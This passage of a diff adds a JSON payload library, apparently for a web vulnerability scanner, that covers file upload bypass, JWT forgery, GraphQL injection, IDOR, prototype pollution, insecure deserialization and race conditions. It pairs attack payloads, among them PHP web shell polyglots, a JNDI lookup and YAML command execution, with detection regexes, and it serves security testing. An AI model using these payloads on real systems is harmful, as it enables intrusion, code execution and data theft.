+          "payload": "SHLD{{MARKER}}.php.jpg",
+          "encoding": "none",
+          "type": "double_ext_jpg"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php.png",
+          "encoding": "none",
+          "type": "double_ext_png"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php.gif",
+          "encoding": "none",
+          "type": "double_ext_gif"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php%00.jpg",
+          "encoding": "none",
+          "type": "null_byte_ext"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.PhP",
+          "encoding": "none",
+          "type": "case_bypass"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php.",
+          "encoding": "none",
+          "type": "trailing_dot"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php ",
+          "encoding": "none",
+          "type": "trailing_space"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.asp",
+          "encoding": "none",
+          "type": "asp_shell"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.aspx",
+          "encoding": "none",
+          "type": "aspx_shell"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.jsp",
+          "encoding": "none",
+          "type": "jsp_shell"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.cfm",
+          "encoding": "none",
+          "type": "cfm_shell"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.shtml",
+          "encoding": "none",
+          "type": "shtml_ssi"
+        },
+        {
+          "payload": "GIF89a;<?php system($_REQUEST['c']); echo 'SHLD{{MARKER}}'; ?>",
+          "encoding": "none",
+          "type": "gif_polyglot_marker"
+        },
+        {
+          "payload": "JFIF<?php echo 'SHLD{{MARKER}}'; system($_GET['cmd']); ?>",
+          "encoding": "none",
+          "type": "jpeg_polyglot"
+        },
+        {
+          "payload": "../../../uploads/SHLD{{MARKER}}.php",
+          "encoding": "none",
+          "type": "path_traversal_upload"
+        },
+        {
+          "payload": ".htaccess\r\nAddType application/x-httpd-php .SHLD{{MARKER}}\r\n",
+          "encoding": "none",
+          "type": "htaccess_addtype"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "SHLD{{MARKER}}.php",
+          "encoding": "null_byte",
+          "type": "null_byte_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "File uploaded successfully"
+          },
+          {
+            "type": "regex",
+            "value": "successfully uploaded"
+          },
+          {
+            "type": "regex",
+            "value": "/uploads/SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "saved as SHLD[A-Z0-9]{4,16}\\.php"
+          },
+          {
+            "type": "string",
+            "value": "has been uploaded"
+          },
+          {
+            "type": "regex",
+            "value": "uid=\\d+\\([a-z_]+\\)"
+          },
+          {
+            "type": "regex",
+            "value": "<?php.*system\\("
+          },
+          {
+            "type": "regex",
+            "value": "Content-Type:.*multipart"
+          },
+          {
+            "type": "string",
+            "value": "GIF89a"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 200.*\\.php"
+          },
+          {
+            "type": "regex",
+            "value": "X-Content-Type-Options missing"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "JWT": {
+      "name_abbr": "JWT",
+      "name_full": "jwt_vulnerabilities",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "header",
+        "cookie",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJtYXJrZXIiOiJTSExEe3tNQVJLRVJ9fSJ9.",
+          "encoding": "none",
+          "type": "none_algorithm_admin"
+        },
+        {
+          "payload": "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJtYXJrZXIiOiJTSExEe3tNQVJLRVJ9fSJ9.",
+          "encoding": "none",
+          "type": "none_uppercase"
+        },
+        {
+          "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJtYXJrZXIiOiJTSExEe3tNQVJLRVJ9fSJ9.invalid_sig",
+          "encoding": "none",
+          "type": "none_with_invalid_sig"
+        },
+        {
+          "payload": "{\"kid\": \"../../../../dev/null\", \"alg\": \"HS256\"}",
+          "encoding": "none",
+          "type": "kid_path_traversal"
+        },
+        {
+          "payload": "{\"kid\": \"| echo SHLD{{MARKER}};id\", \"alg\": \"HS256\"}",
+          "encoding": "none",
+          "type": "kid_rce"
+        },
+        {
+          "payload": "{\"kid\": \"SHLD{{MARKER}}' UNION SELECT 'hacked'-- -\", \"alg\": \"HS256\"}",
+          "encoding": "none",
+          "type": "kid_sqli"
+        },
+        {
+          "payload": "{\"kid\": \"http://shld.io/SHLD{{MARKER}}\", \"alg\": \"HS256\"}",
+          "encoding": "none",
+          "type": "kid_ssrf"
+        },
+        {
+          "payload": "{\"jwk\": {\"kty\": \"oct\", \"k\": \"SHLD{{MARKER}}YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh\"}, \"alg\": \"HS256\"}",
+          "encoding": "none",
+          "type": "jwk_embedded"
+        },
+        {
+          "payload": "{\"jku\": \"https://shld.io/SHLD{{MARKER}}.json\", \"alg\": \"RS256\"}",
+          "encoding": "none",
+          "type": "jku_injection"
+        },
+        {
+          "payload": "{\"x5u\": \"https://shld.io/SHLD{{MARKER}}.crt\", \"alg\": \"RS256\"}",
+          "encoding": "none",
+          "type": "x5u_injection"
+        },
+        {
+          "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiIsIm1hcmtlciI6IlNITER7e01BUktFUn19In0.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "weak_secret_crack"
+        },
+        {
+          "payload": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJtYXJrZXIiOiJTSExEe3tNQVJLRVJ9fSJ9.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "rs256_to_hs256_confusion"
+        },
+        {
+          "payload": "{\"alg\": \"HS256\", \"typ\": \"JWT\", \"crit\": [\"SHLD{{MARKER}}\"]}",
+          "encoding": "none",
+          "type": "crit_header_bypass"
+        },
+        {
+          "payload": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjAsImV4cCI6OTk5OTk5OTk5OSwibWFya2VyIjoiU0hMRHt7TUFSS0VSfX0ifQ.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "expired_claim_bypass"
+        },
+        {
+          "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJtYXJrZXIiOiJTSExEe3tNQVJLRVJ9fSJ9.",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJtYXJrZXIiOiJTSExEe3tNQVJLRVJ9fSJ9.",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "{\"alg\": \"none\", \"typ\": \"JWT\"}",
+          "encoding": "none",
+          "type": "header_only_none"
+        },
+        {
+          "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluXCIsXCJyb2xlXCI6XCJzdXBlcmFkbWluIiwibWFya2VyIjoiU0hMRHt7TUFSS0VSfX0ifQ.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "payload_injection"
+        },
+        {
+          "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJncm91cHMiOlsic3VwZXJhZG1pbnMiXSwibWFya2VyIjoiU0hMRHt7TUFSS0VSfX0ifQ.",
+          "encoding": "none",
+          "type": "groups_escalation"
+        },
+        {
+          "payload": "{\"alg\": \"HS256\", \"typ\": \"JWT\", \"kid\": \"shld{{MARKER}}\"}",
+          "encoding": "none",
+          "type": "kid_marker"
+        },
+        {
+          "payload": "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJtYXJrZXIiOiJTSExEe3tNQVJLRVJ9fSJ9.",
+          "encoding": "none",
+          "type": "short_none"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "Welcome admin"
+          },
+          {
+            "type": "regex",
+            "value": "\"role\"\\s*:\\s*\"(admin|superadmin)\""
+          },
+          {
+            "type": "string",
+            "value": "\"isAdmin\":true"
+          },
+          {
+            "type": "string",
+            "value": "privileged access granted"
+          },
+          {
+            "type": "regex",
+            "value": "alg.*none.*accepted"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*token="
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "uid=\\d+\\([a-z_]+\\)"
+          },
+          {
+            "type": "regex",
+            "value": "\"marker\"\\s*:\\s*\"SHLD"
+          },
+          {
+            "type": "string",
+            "value": "invalid signature ignored"
+          },
+          {
+            "type": "regex",
+            "value": "Authorization.*Bearer.*eyJ"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "GraphQLi": {
+      "name_abbr": "GraphQLi",
+      "name_full": "graphql_injection",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "query",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "{__schema{types{name kind}}}",
+          "encoding": "none",
+          "type": "introspection_compact"
+        },
+        {
+          "payload": "{__type(name:\"User\"){fields{name type{name kind ofType{name}}}}}",
+          "encoding": "none",
+          "type": "type_probe"
+        },
+        {
+          "payload": "{__schema{queryType{name} mutationType{name} subscriptionType{name}}}",
+          "encoding": "none",
+          "type": "schema_roots"
+        },
+        {
+          "payload": "{user(id:\"SHLD{{MARKER}}' OR 1=1-- -\"){id name email}}",
+          "encoding": "none",
+          "type": "sqli_in_resolver"
+        },
+        {
+          "payload": "{users(filter:{username:{_eq:\"admin' OR 'SHLD{{MARKER}}'='SHLD{{MARKER}}\"}}) {id}}",
+          "encoding": "none",
+          "type": "hasura_sqli"
+        },
+        {
+          "payload": "{user{posts{user{posts{user{posts{user{posts{title}}}}}}}}}}",
+          "encoding": "none",
+          "type": "nested_dos"
+        },
+        {
+          "payload": "[{\"query\":\"{user(id:1){name}}\"},{\"query\":\"{user(id:2){name}}\"},{\"query\":\"{user(id:3){email}}\"}]",
+          "encoding": "none",
+          "type": "batching_probe"
+        },
+        {
+          "payload": "mutation{createUser(input:{username:\"SHLD{{MARKER}}\",role:\"admin\",email:\"shld@shld.io\"}){id}}",
+          "encoding": "none",
+          "type": "mutation_escalation"
+        },
+        {
+          "payload": "mutation{deleteUser(id:1, marker:\"SHLD{{MARKER}}\")}",
+          "encoding": "none",
+          "type": "mutation_delete"
+        },
+        {
+          "payload": "{userByEmail(email:\"admin@target.com\\\")){id name role marker}}",
+          "encoding": "none",
+          "type": "field_suggestion_probe"
+        },
+        {
+          "payload": "{__type(name:\"Mutation\"){fields{name args{name type{name}}}}}",
+          "encoding": "none",
+          "type": "mutation_introspection"
+        },
+        {
+          "payload": "{users(first:100 after:\"SHLD{{MARKER}}\"){edges{node{id email passwordHash}}}}",
+          "encoding": "none",
+          "type": "cursor_probe"
+        },
+        {
+          "payload": "{search(q:\"SHLD{{MARKER}}\\\" OR 1=1--\"){results{id title}}}",
+          "encoding": "none",
+          "type": "search_sqli"
+        },
+        {
+          "payload": "{node(id:\"SHLD{{MARKER}}\"){...on User{email role}}}",
+          "encoding": "none",
+          "type": "node_idor"
+        },
+        {
+          "payload": "{__schema{directives{name locations args{name}}}}",
+          "encoding": "none",
+          "type": "directive_introspection"
+        },
+        {
+          "payload": "query SHLD{{MARKER}}{viewer{login email}}",
+          "encoding": "none",
+          "type": "named_query_marker"
+        },
+        {
+          "payload": "{user(id:\"SHLD{{MARKER}}\")@skip(if:false){name email}}",
+          "encoding": "none",
+          "type": "directive_skip"
+        },
+        {
+          "payload": "{...on Query{user(id:\"SHLD{{MARKER}}\"){name email}}}",
+          "encoding": "none",
+          "type": "inline_fragment"
+        },
+        {
+          "payload": "subscription{messageAdded(channelId:\"SHLD{{MARKER}}\"){id body author}}",
+          "encoding": "none",
+          "type": "subscription_probe"
+        },
+        {
+          "payload": "{user(id:\"SHLD{{MARKER}}\"){name email}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "{user(id:\"SHLD{{MARKER}}\"){name email}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "string",
+            "value": "\"__schema\""
+          },
+          {
+            "type": "string",
+            "value": "\"queryType\""
+          },
+          {
+            "type": "string",
+            "value": "\"mutationType\""
+          },
+          {
+            "type": "regex",
+            "value": "\"kinds\":\\s*\\["
+          },
+          {
+            "type": "string",
+            "value": "\"OBJECT\""
+          },
+          {
+            "type": "string",
+            "value": "\"SCALAR\""
+          },
+          {
+            "type": "regex",
+            "value": "graphql.*error"
+          },
+          {
+            "type": "string",
+            "value": "Cannot query field"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "passwordHash"
+          },
+          {
+            "type": "regex",
+            "value": "\"data\":\\{\"user\":\\{\"email\""
+          },
+          {
+            "type": "regex",
+            "value": "\"errors\".*\"message\".*Cannot"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "IDOR": {
+      "name_abbr": "IDOR",
+      "name_full": "insecure_direct_object_reference",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "/api/users/1/profile?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "sequential_user"
+        },
+        {
+          "payload": "/api/users/2/profile?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "sequential_user"
+        },
+        {
+          "payload": "/api/users/0/profile?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "zero_id"
+        },
+        {
+          "payload": "/api/users/-1/profile?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "negative_id"
+        },
+        {
+          "payload": "/api/documents/1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "doc_sequential"
+        },
+        {
+          "payload": "/api/orders/1000?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "order_sequential"
+        },
+        {
+          "payload": "/api/invoices/1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "invoice_sequential"
+        },
+        {
+          "payload": "?id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "param_id"
+        },
+        {
+          "payload": "?user_id=2&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "param_user_id"
+        },
+        {
+          "payload": "?account_id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "param_account_id"
+        },
+        {
+          "payload": "?doc_id=999&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "param_doc_id"
+        },
+        {
+          "payload": "/api/admin/users?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "admin_listing"
+        },
+        {
+          "payload": "/api/users/me/../1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "path_traversal_idor"
+        },
+        {
+          "payload": "/api/profile?uuid=00000000-0000-0000-0000-000000000001&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "uuid_sequential"
+        },
+        {
+          "payload": "/api/files/download?id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "file_download_id"
+        },
+        {
+          "payload": "/api/exports/1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "export_id"
+        },
+        {
+          "payload": "/api/receipts/1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "receipt_id"
+        },
+        {
+          "payload": "?customer_id=1&SHLD{{MARKER}}=1",
+          "encoding": "none",
+          "type": "param_customer"
+        },
+        {
+          "payload": "/api/tickets/1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "ticket_id"
+        },
+        {
+          "payload": "/api/messages/1?ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "message_id"
+        },
+        {
+          "payload": "/api/users/1/profile?ref=SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "/api/users/1/profile?ref=SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "\"email\":\\s*\"[^\"]+@[^\"]+\""
+          },
+          {
+            "type": "regex",
+            "value": "\"phone\":\\s*\"[\\d\\+\\-\\(\\) ]+\""
+          },
+          {
+            "type": "regex",
+            "value": "\"address\":\\s*\""
+          },
+          {
+            "type": "regex",
+            "value": "\"account_number\":\\s*\""
+          },
+          {
+            "type": "regex",
+            "value": "\"ssn\":\\s*\""
+          },
+          {
+            "type": "regex",
+            "value": "\"credit_card\":\\s*\"[0-9 \\-]+\""
+          },
+          {
+            "type": "string",
+            "value": "personal information"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "\"user_id\":\\s*\\d+"
+          },
+          {
+            "type": "regex",
+            "value": "\"role\":\\s*\"admin\""
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 200 OK"
+          },
+          {
+            "type": "regex",
+            "value": "\"password_hash\":\\s*\""
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "Prototype_Pollution": {
+      "name_abbr": "Prototype_Pollution",
+      "name_full": "prototype_pollution",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "body",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "{\"__proto__\": {\"isAdmin\": true, \"marker\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "proto_admin_marker"
+        },
+        {
+          "payload": "{\"constructor\": {\"prototype\": {\"isAdmin\": true, \"marker\": \"SHLD{{MARKER}}\"}}}",
+          "encoding": "none",
+          "type": "constructor_proto"
+        },
+        {
+          "payload": "?__proto__[isAdmin]=true&__proto__[marker]=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "qs_proto"
+        },
+        {
+          "payload": "?constructor[prototype][isAdmin]=true&constructor[prototype][marker]=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "qs_constructor"
+        },
+        {
+          "payload": "{\"__proto__\": {\"polluted\": \"SHLD{{MARKER}}\", \"toString\": \"[object Object]\"}}",
+          "encoding": "none",
+          "type": "tostring_override"
+        },
+        {
+          "payload": "{\"__proto__\": {\"outputFunctionName\": \"_x;echo SHLD{{MARKER}};x//\"}}",
+          "encoding": "none",
+          "type": "ssti_gadget"
+        },
+        {
+          "payload": "{\"__proto__\": {\"shell\": \"node\", \"NODE_OPTIONS\": \"--require /proc/self/environ\"}}",
+          "encoding": "none",
+          "type": "node_options_rce"
+        },
+        {
+          "payload": "{\"__proto__\": {\"escapeMarkup\": false, \"marker\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "template_escape"
+        },
+        {
+          "payload": "{\"__proto__\": {\"type\": \"administrator\", \"marker\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "type_escalation"
+        },
+        {
+          "payload": "{\"__proto__\": {\"allowedRoles\": [\"admin\"], \"marker\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "role_escalation"
+        },
+        {
+          "payload": "{\"__proto__\": {\"query\": \"SHLD{{MARKER}}' OR 1=1-- -\"}}",
+          "encoding": "none",
+          "type": "sqli_gadget"
+        },
+        {
+          "payload": "{\"__proto__\": {\"src\": \"https://shld.io/SHLD{{MARKER}}.js\"}}",
+          "encoding": "none",
+          "type": "script_src_gadget"
+        },
+        {
+          "payload": "{\"__proto__\": {\"content\": \"<script>fetch('https://shld.io/SHLD{{MARKER}}')</script>\"}}",
+          "encoding": "none",
+          "type": "xss_gadget"
+        },
+        {
+          "payload": "{\"__proto__\": {\"headers\": {\"X-Marker\": \"SHLD{{MARKER}}\"}}}",
+          "encoding": "none",
+          "type": "header_injection_gadget"
+        },
+        {
+          "payload": "{\"__proto__\": {\"env\": {\"NODE_ENV\": \"development\"}, \"marker\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "env_override"
+        },
+        {
+          "payload": "{\"__proto__\": {\"default\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "default_override"
+        },
+        {
+          "payload": "{\"__proto__\": {\"valueOf\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "none",
+          "type": "valueof_override"
+        },
+        {
+          "payload": "[{\"__proto__\": {\"marker\": \"SHLD{{MARKER}}\"}}, {\"__proto__\": {\"isAdmin\": true}}]",
+          "encoding": "none",
+          "type": "array_merge_pollution"
+        },
+        {
+          "payload": "{\"__proto__\": {\"isAdmin\": true, \"marker\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "{\"__proto__\": {\"isAdmin\": true, \"marker\": \"SHLD{{MARKER}}\"}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "?__proto__.marker=SHLD{{MARKER}}&__proto__.isAdmin=true",
+          "encoding": "url",
+          "type": "qs_url_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "\"isAdmin\"\\s*:\\s*true"
+          },
+          {
+            "type": "regex",
+            "value": "\"marker\"\\s*:\\s*\"SHLD"
+          },
+          {
+            "type": "string",
+            "value": "__proto__ accepted"
+          },
+          {
+            "type": "string",
+            "value": "prototype chain modified"
+          },
+          {
+            "type": "string",
+            "value": "constructor.prototype"
+          },
+          {
+            "type": "regex",
+            "value": "\"role\"\\s*:\\s*\"admin\""
+          },
+          {
+            "type": "regex",
+            "value": "\"polluted\"\\s*:\\s*\"SHLD"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "\"type\"\\s*:\\s*\"administrator\""
+          },
+          {
+            "type": "string",
+            "value": "outputFunctionName"
+          },
+          {
+            "type": "regex",
+            "value": "NODE_OPTIONS.*require"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecDeser": {
+      "name_abbr": "InsecDeser",
+      "name_full": "insecure_deserialization",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "form",
+        "cookie",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "O:8:\\\"EvilExec\\\":1:{s:3:\\\"cmd\\\";s:30:\\\"echo SHLD{{MARKER}};id;hostname\\\";}",
+          "encoding": "none",
+          "type": "php_object_rce"
+        },
+        {
+          "payload": "O:29:\\\"Illuminate\\\\Broadcasting\\\\PendingBroadcast\\\":2:{s:9:\\\"*events\\\";O:28:\\\"Illuminate\\\\Events\\\\Dispatcher\\\":1:{s:12:\\\"*listeners\\\";a:1:{s:14:\\\"SHLD{{MARKER}}\\\";a:1:{i:0;s:6:\\\"system\\\";}}}s:8:\\\"*event\\\";s:22:\\\"echo SHLD{{MARKER}};id\\\";}",
+          "encoding": "none",
+          "type": "php_laravel_gadget"
+        },
+        {
+          "payload": "a:2:{s:4:\\\"user\\\";s:5:\\\"admin\\\";s:6:\\\"marker\\\";s:14:\\\"SHLD{{MARKER}}\\\";}",
+          "encoding": "none",
+          "type": "php_array_probe"
+        },
+        {
+          "payload": "{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){require('child_process').exec('echo SHLD{{MARKER}};id', function(e, stdout) { console.log(stdout) });}()\\\"}",
+          "encoding": "none",
+          "type": "node_serialize_rce"
+        },
+        {
+          "payload": "{\\\"type\\\":\\\"Buffer\\\",\\\"data\\\":[83,72,76,68]}",
+          "encoding": "none",
+          "type": "node_buffer_probe"
+        },
+        {
+          "payload": "rO0ABXNyACVvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuTWFwMTM0MDcxOTMyNTU5MjM3ODMCAAAB",
+          "encoding": "none",
+          "type": "java_commons_collections"
+        },
+        {
+          "payload": "aced0005737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c756578720010",
+          "encoding": "none",
+          "type": "java_serialized_header"
+        },
+        {
+          "payload": "YToxOntzOjc6Im1hcmtlciI7czoxNDoiU0hMRHt7TUFSS0VSfX0iO30=",
+          "encoding": "none",
+          "type": "php_b64_deser"
+        },
+        {
+          "payload": "O:8:\\\"EvilExec\\\":1:{s:3:\\\"cmd\\\";s:30:\\\"echo SHLD{{MARKER}};id;hostname\\\";}",
+          "encoding": "base64",
+          "type": "php_b64"
+        },
+        {
+          "payload": "4f3a383a224576696c45786563223a313a7b733a333a22636d64223a733a32303a226563686f2053484c44",
+          "encoding": "none",
+          "type": "php_hex",
+          "note": "hex encoded SHLD{{MARKER}} (sans les doubles accolades)"
+        },
+        {
+          "payload": "{\\\"@class\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://shld.io/SHLD{{MARKER}}\\\",\\\"autoCommit\\\":true}",
+          "encoding": "none",
+          "type": "jackson_ldap_jndi"
+        },
+        {
+          "payload": "{\\\"@type\\\":\\\"com.alibaba.fastjson.annotation.JSONField\\\",\\\"name\\\":\\\"SHLD{{MARKER}}\\\"}",
+          "encoding": "none",
+          "type": "fastjson_probe"
+        },
+        {
+          "payload": "!!python/object/apply:os.system [\\\"echo SHLD{{MARKER}};id\\\"]",
+          "encoding": "none",
+          "type": "python_yaml_rce"
+        },
+        {
+          "payload": "!!python/object/new:subprocess.check_output [[\\\"sh\\\",\\\"-c\\\",\\\"echo SHLD{{MARKER}};id\\\"]]",
+          "encoding": "none",
+          "type": "python_yaml_subprocess"
+        },
+        {
+          "payload": "--- !ruby/object:Gem::Requirement\\nrequirements:\\n- - \\\"SHLD{{MARKER}}\\\"\\n  - !ruby/object:Gem::Version\\n    version: 0.0.0",
+          "encoding": "none",
+          "type": "ruby_marshal_probe"
+        },
+        {
+          "payload": "O:8:\\\"EvilExec\\\":1:{s:3:\\\"cmd\\\";s:30:\\\"echo SHLD{{MARKER}};id;hostname\\\";}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "{\\\"rce\\\":\\\"_$$ND_FUNC$$_function(){require('child_process').exec('echo SHLD{{MARKER}}')}()\\\"}",
+          "encoding": "none",
+          "type": "node_shortform"
+        },
+        {
+          "payload": "O:29:\\\"GuzzleHttp\\\\Cookie\\\\SetCookie\\\":1:{s:33:\\\"\\u0000GuzzleHttp\\\\Cookie\\\\SetCookie\\u0000data\\\";a:1:{s:7:\\\"Expires\\\";O:17:\\\"Mockery\\\\Generator\\\\MockConfiguration\\\":0:{}}}",
+          "encoding": "none",
+          "type": "php_guzzle_gadget"
+        },
+        {
+          "payload": "YToxOntzOjY6Im1hcmtlciI7czoxNDoiU0hMRHt7TUFSS0VSfX0iO30=",
+          "encoding": "base64",
+          "type": "base64_marker"
+        },
+        {
+          "payload": "!!python/object/apply:subprocess.check_output [[\\\"sh\\\",\\\"-c\\\",\\\"echo SHLD{{MARKER}};id\\\"]]",
+          "encoding": "none",
+          "type": "python_yaml_v2"
+        },
+        {
+          "payload": "O:8:\\\"EvilExec\\\":1:{s:3:\\\"cmd\\\";s:30:\\\"echo SHLD{{MARKER}};id;hostname\\\";}",
+          "encoding": "null_byte",
+          "type": "null_byte_php"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "uid=\\d+\\([a-z_]+\\) gid=\\d+"
+          },
+          {
+            "type": "string",
+            "value": "unserialize(): Error at offset"
+          },
+          {
+            "type": "string",
+            "value": "PHP Notice:  unserialize()"
+          },
+          {
+            "type": "string",
+            "value": "_$$ND_FUNC$$_"
+          },
+          {
+            "type": "regex",
+            "value": "shld\\.io"
+          },
+          {
+            "type": "string",
+            "value": "com.fasterxml.jackson.databind.exc"
+          },
+          {
+            "type": "string",
+            "value": "yaml.constructor.ConstructorError"
+          },
+          {
+            "type": "regex",
+            "value": "ClassNotFoundException.*java\\.lang"
+          },
+          {
+            "type": "string",
+            "value": "resolve class"
+          },
+          {
+            "type": "regex",
+            "value": "O:8:\"Evil"
+          },
+          {
+            "type": "string",
+            "value": "UnmarshalException"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "RaceCondition": {
+      "name_abbr": "RaceCondition",
+      "name_full": "race_conditions",
+      "severity": "medium",
+      "cvss_base": 6.5,
+      "injection_points": [
+        "form",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "concurrent_request_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "concurrent_marker"
+        },
+        {
+          "payload": "?coupon_code=DISCOUNT50&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "coupon_race"
+        },
+        {
+          "payload": "?action=redeem&token=SHLD{{MARKER}}&amount=100",
+          "encoding": "none",
